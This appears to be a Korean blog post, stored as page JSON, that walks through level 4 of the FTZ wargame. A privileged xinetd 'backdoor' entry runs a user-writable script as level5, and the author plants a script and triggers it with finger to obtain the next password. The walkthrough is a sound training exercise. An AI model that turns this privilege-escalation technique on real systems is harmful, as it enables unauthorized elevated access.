{"componentChunkName":"component---src-templates-blog-post-tsx","path":"/articles/2015-07/FTZ-level4","result":{"data":{"site":{"siteMetadata":{"title":"GyeongSu Han's Github Pages","author":"@micalgenus","siteUrl":"https://micalgenus.github.io"}},"markdownRemark":{"id":"8ed1f165-4e55-5ea0-b1ee-142ae6645530","html":"<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[level4@ftz ~]$ cat hint\n\n누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!</code></pre></div>\n<p>/etc/xinetd.d폴더를 확인해 보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>level4@ftz ~<span class=\"token punctuation\">]</span>$ <span class=\"token builtin class-name\">cd</span> /etc/xinetd.d/\n<span class=\"token punctuation\">[</span>level4@ftz xinetd.d<span class=\"token punctuation\">]</span>$ <span class=\"token function\">ls</span> -al\ntotal <span class=\"token number\">88</span>\ndrwxr-xr-x    <span class=\"token number\">2</span> root     root         <span class=\"token number\">4096</span> Jun <span class=\"token number\">29</span> <span class=\"token number\">14</span>:53 <span class=\"token builtin class-name\">.</span>\ndrwxr-xr-x   <span class=\"token number\">53</span> root     root         <span class=\"token number\">4096</span> Jul  <span class=\"token number\">8</span> <span class=\"token number\">12</span>:21 <span class=\"token punctuation\">..</span>\n-r--r--r--    <span class=\"token number\">1</span> root     level4        <span class=\"token number\">171</span> Sep <span class=\"token number\">10</span>  <span class=\"token number\">2011</span> backdoor\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">560</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> chargen\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">580</span> Apr <span class=\"token number\">17</span>  <span class=\"token number\">2003</span> chargen-udp\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">417</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> daytime\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">437</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> daytime-udp\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">339</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> <span class=\"token builtin class-name\">echo</span>\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">358</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> echo-udp\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">317</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> finger\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">273</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> ntalk\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">359</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> rexec\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">376</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> rlogin\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">429</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> rsh\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">317</span> Sep <span class=\"token number\">29</span>  <span class=\"token number\">2004</span> <span class=\"token function\">rsync</span>\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">310</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> servers\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">312</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> services\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">406</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> sgi_fam\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">261</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> talk\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">305</span> Sep <span class=\"token number\">10</span>  <span class=\"token number\">2011</span> telnet\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">495</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> <span class=\"token function\">time</span>\n-rw-r--r--    <span class=\"token number\">1</span> root     root          <span class=\"token number\">515</span> Dec <span class=\"token number\">19</span>  <span class=\"token number\">2007</span> time-udp</code></pre></div>\n<p>이중 backdoor라는 파일이 의심스럽다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>level4@ftz xinetd.d<span class=\"token punctuation\">]</span>$ <span class=\"token function\">cat</span> backdoor\n<span class=\"token function\">service</span> finger\n<span class=\"token punctuation\">{</span>\n    disable        <span class=\"token operator\">=</span> no\n    flags          <span class=\"token operator\">=</span> REUSE\n    socket_type    <span class=\"token operator\">=</span> stream\n    <span class=\"token function\">wait</span>           <span class=\"token operator\">=</span> no\n    user           <span class=\"token operator\">=</span> level5\n    server         <span class=\"token operator\">=</span> /home/level4/tmp/backdoor\n    log_on_failure <span class=\"token operator\">+=</span> USERID\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>살펴보면 finger서비스를 작동시킬때, level5의 권한으로 /home/level4/tmp/backdoor파일을 실행시킨다.</p>\n<p><code class=\"language-text\">xinetd</code>은 외부에서 서비스를 실행시킬 때 데몬이 대기하고 있어야 하는데, 여러 데몬을 기다리도록 만들 경우 낭비가 심하여 그를 해결하기 위한 관리 데몬이라 생각하면 될것 같다.</p>\n<p><a href=\"http://lily.mmu.ac.kr/lecture/08sm/Fedora2/7jang/2.htm\">http://lily.mmu.ac.kr/lecture/08sm/Fedora2/7jang/2.htm</a> 더 자세한 내용은 참고하면 됩니다.</p>\n<p>finger서비스를 구동시켜야 하는데, finger @localhost를 실행할 경우 finger가 외부로 요청을 보내게 됩니다.</p>\n<p>그 것을 localhost로 받기 때문에, 다시 돌아와 외부에서 실행하는 서비스로 수행하게 됩니다. 이 서비스를 level5의 권한으로 backdoor를 실행하게 됩니다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>level4@ftz tmp<span class=\"token punctuation\">]</span>$ <span class=\"token builtin class-name\">pwd</span>\n/home/level4/tmp\n<span class=\"token punctuation\">[</span>level4@ftz tmp<span class=\"token punctuation\">]</span>$ <span class=\"token function\">ls</span>\n<span class=\"token punctuation\">[</span>level4@ftz tmp<span class=\"token punctuation\">]</span>$</code></pre></div>\n<p>tmp폴더를 확인해 보면 프로그램이 존재하지 않습니다. 직접 만들어야 합니다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>level4@ftz tmp<span class=\"token punctuation\">]</span>$ <span class=\"token function\">cat</span> <span class=\"token operator\">></span> backdoor\n<span class=\"token comment\">#!/bin/bash</span>\nmy-pass\n<span class=\"token punctuation\">[</span>level4@ftz tmp<span class=\"token punctuation\">]</span>$ <span class=\"token function\">chmod</span> +x backdoor</code></pre></div>\n<p>이렇게 프로그램을 작성해 줍니다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>level4@ftz tmp<span class=\"token punctuation\">]</span>$ finger @localhost\n^<span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>H^<span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>J\nLevel5 Password is <span class=\"token string\">\"             \"</span><span class=\"token builtin class-name\">.</span></code></pre></div>\n<p>이렇게 서비스를 작동시켜 주게 될 경우 backdoor프로그램이 정상적으로 실행됩니다.</p>","frontmatter":{"categories":["Wargame"],"title":"FTZ Level4","date":"Jul 14, 2015","tags":["FTZ"]}}},"pageContext":{"comments":true,"previous":{"frontmatter":{"path":"/articles/2015-06/python-2.7-upgrade","title":"python 2.7 upgrade","comments":true}},"next":{"frontmatter":{"path":"/articles/2015-09/XenServer-Local-ISO-repository","title":"XenServer Local ISO repository","comments":true}}}}}